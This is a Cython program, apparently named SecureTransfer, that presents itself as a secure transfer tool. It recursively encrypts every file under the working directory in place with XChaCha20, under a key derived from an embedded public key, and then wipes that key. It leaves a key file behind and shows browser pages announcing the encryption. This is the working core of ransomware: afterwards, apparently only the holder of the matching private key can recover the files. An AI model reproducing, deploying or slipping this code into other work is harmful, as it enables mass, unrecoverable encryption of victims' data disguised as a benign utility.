# SecureTransfer.Encrypt


# distutils: sources = lib/c25519/src/f25519.c lib/c25519/src/c25519.c lib/xchacha20/src/chacha20r.c lib/xchacha20/src/chacha20.c lib/xchacha20/src/hchacha20.c lib/xchacha20/src/xchacha20.c
# distutils: include_dirs = lib/c25519/src/ lib/xchacha20/src/


from libc.stdint cimport *

from ecc cimport *
from xcc cimport *

import base64
import concurrent.futures
import os
import secrets
import sys
import time
import webbrowser


cdef bytes PK = b'5d774eea5c7b1d65df5950134f3718b112ec9bc964bcb4561024fa5803f1cf38'

cdef enum: NW = 64

cdef str WD = os.getcwd()

cdef str UPKFN = 'STKEY.txt'

cdef str STFN = 'st.html'
cdef bytes ST = b'PCFkb2N0eXBlIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5TZWN1cmVUcmFuc2ZlcjwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICogewogICAgICAgIG1hcmdpbjogMDsKICAgICAgICBwYWRkaW5nOiAwOwogICAgICB9CiAgICAgIAogICAgICBib2R5IHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsKICAgICAgICBmb250LWZhbWlseTogbW9ub3NwYWNlOwogICAgICB9CiAgICAgIAogICAgICBtYWluIHsKICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgICAgdG9wOiA1MCU7CiAgICAgICAgbGVmdDogNTAlOwogICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWCgtNTAlKSB0cmFuc2xhdGVZKC01MCUpOwogICAgICB9CiAgICAgIAogICAgICBoMiwgaDMgewogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICBjb2xvcjogZ3JheTsKICAgICAgfQogICAgPC9zdHlsZT4KICA8L2hlYWQ+CiAgPGJvZHk+CiAgICA8bWFpbj4KICAgICAgPGgyPlNlY3VyZVRyYW5zZmVyIGlzIGVuY3J5cHRpbmcgeW91ciBmaWxlcy4uLjwvaDI+CiAgICAgIDxoMz5EbyBub3QgdHVybiBvZmYgeW91ciBQQyB1bnRpbCBub3RpZmllZC48L2gzPgogICAgPC9tYWluPgogIDwvYm9keT4KPC9odG1sPgo='

cdef str DONEFN = 'done.html'
cdef bytes DONE = b'PCFkb2N0eXBlIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5TZWN1cmVUcmFuc2ZlcjwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICogewogICAgICAgIG1hcmdpbjogMDsKICAgICAgICBwYWRkaW5nOiAwOwogICAgICB9CiAgICAgIAogICAgICBib2R5IHsKICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiBibGFjazsKICAgICAgICBmb250LWZhbWlseTogbW9ub3NwYWNlOwogICAgICB9CiAgICAgIAogICAgICBtYWluIHsKICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgICAgdG9wOiA1MCU7CiAgICAgICAgbGVmdDogNTAlOwogICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWCgtNTAlKSB0cmFuc2xhdGVZKC01MCUpOwogICAgICB9CiAgICAgIAogICAgICBoMiwgaDMgewogICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICBjb2xvcjogbGltZWdyZWVuOwogICAgICB9CiAgICA8L3N0eWxlPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDxtYWluPgogICAgICA8aDI+RG9uZSE8L2gyPgogICAgICA8aDM+Tm93IHlvdSBjYW4gc2FmZWx5IHR1cm4gb2ZmIHlvdXIgUEMgaWYgeW91IHdhbnQuPC9oMz4KICAgIDwvbWFpbj4KICA8L2JvZHk+CjwvaHRtbD4K'

cdef list STIGNORE = [
    UPKFN,
    STFN,
]

cdef enum: MAXSIZE = 999999999

cdef enum: KSIZE = 32
cdef enum: NSIZE = 24
cdef enum: BLKSIZE = 64


cdef void enc(str fn, uint8_t k[KSIZE]) except *:
    if fn in STIGNORE:
        return
    
    if not (os.path.isfile(fn)):
        return
    
    cdef int fs = os.path.getsize(fn)
    if fs == 0 or fs > MAXSIZE:
        return
    
    cdef int i, j
    
    cdef xchacha20_ctx x
    
    xchacha20_keysetup(&x, k)
    
    cdef uint8_t n[NSIZE]
    for i in range(NSIZE):
        n[i] = <uint8_t>secrets.randbits(8)
    
    try:
        with open(f'{fn}.stinfo', 'wb') as f:
            for i in range(NSIZE):
                f.write(f'{n[i]:02x}'.encode('ascii'))
    except:
        return
    
    xchacha20_noncesetup(&x, n)
    
    cdef uint8_t blk[BLKSIZE]
    cdef int rb
    try:
        with open(fn, 'r+b') as f:
            i = 0
            for i in range(1, 1 + (fs // BLKSIZE)):
                for j in range(BLKSIZE):
                    blk[j] = <uint8_t>ord(f.read(1))
                
                xchacha20_ctrsetup(&x, i)
                xchacha20_encrypt(&x, blk, blk)
                
                f.seek(-BLKSIZE, 1)
                for j in range(BLKSIZE):
                    f.write(<bytes>blk[j])
            
            rb = fs - (i * BLKSIZE)
            
            for j in range(rb):
                blk[j] = <uint8_t>ord(f.read(1))
            
            xchacha20_ctrsetup(&x, i+1)
            xchacha20_encrypt_bytes(&x, blk, blk, rb)
            
            f.seek(-rb, 1)
            for j in range(rb):
                f.write(<bytes>blk[j])
        
        os.rename(fn, f'{fn}.st')
    except:
        os.remove(f'{fn}.stinfo')


cdef int main(argv) except? 1:
    cdef int i, j
    
    cdef uint8_t pk[F25519_SIZE]
    j = 0
    for i in range(F25519_SIZE):
        pk[i] = <uint8_t>int(PK[j:j+2], 16)
        j += 2
    
    cdef uint8_t sk[C25519_EXPONENT_SIZE]
    for i in range(C25519_EXPONENT_SIZE):
        sk[i] = <uint8_t>secrets.randbits(8)
    c25519_prepare(sk)
    
    cdef uint8_t k[F25519_SIZE]
    c25519_smult(k, pk, sk)
    
    cdef uint8_t upk[F25519_SIZE] # user public key
    c25519_smult(upk, c25519_base_x, sk)
    
    for _ in range(NW):
        for i in range(C25519_EXPONENT_SIZE):
            sk[i] = <uint8_t>secrets.randbits(8)
    
    os.chdir(WD)
    
    while True:
        try:
            with open(UPKFN, 'wb') as f:
                for i in range(F25519_SIZE):
                    f.write(f'{upk[i]:02x}'.encode('ascii'))
            break
        except:
            pass
    
    with open(STFN, 'wb') as f:
        f.write(base64.b64decode(ST))
    webbrowser.open(f'file://{os.path.realpath(STFN)}')
    
    time.sleep(5)
    os.remove(STFN)
    
    for root, dirs, files in os.walk(WD):
        os.chdir(root)
        with concurrent.futures.ThreadPoolExecutor() as x:
            x.map(lambda fn: enc(fn, k), files)
    
    for _ in range(NW):
        for i in range(F25519_SIZE):
            k[i] = <uint8_t>secrets.randbits(8)
    
    os.chdir(WD)
    
    with open(DONEFN, 'wb') as f:
        f.write(base64.b64decode(DONE))
    webbrowser.open(f'file://{os.path.realpath(DONEFN)}')
    
    time.sleep(5)
    os.remove(DONEFN)
    
    return 0


try:
    sys.exit(main(sys.argv))
except:
    pass
